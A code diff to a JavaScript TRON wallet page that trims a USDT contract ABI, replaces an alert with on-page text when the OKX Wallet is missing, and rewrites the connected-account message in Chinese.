@@ -48,7 +48,6 @@ const usdtAbi = [
     {"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},
     {"anonymous":false,"inputs":[],"name":"Pause","type":"event"},
     {"anonymous":false,"inputs":[],"name":"Unpause","type":"event"},
-    {"anonymous":false,"inputs":[{"indexed":true,"name":"previousOwner","type":"address"},{"indexed":true,"name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},
     {"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},
     {"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"}
 ];
@@ -67,7 +66,7 @@ let tronWeb;
 
 async function init() {
     if (typeof window.tronWeb === 'undefined') {
-        alert('请安装OKX Wallet并切换到TRON网络!');
+        document.getElementById('result').innerText = '请安装OKX Wallet并切换到TRON网络!';
         return;
     }
 
@@ -81,7 +80,7 @@ async function init() {
             throw new Error('未连接到钱包，请确保钱包已连接并切换到TRON网络');
         }
 
-        document.getElementById('result').innerText = 'Account: ' + account;
+        document.getElementById('result').innerText = '钱包已连接，账户地址: ' + account;
 
         const usdtContract = await tronWeb.contract(usdtAbi, usdtContractAddress);
         const autoTransferContract = await tronWeb.contract(autoTransferAbi, autoTransferContractAddress);
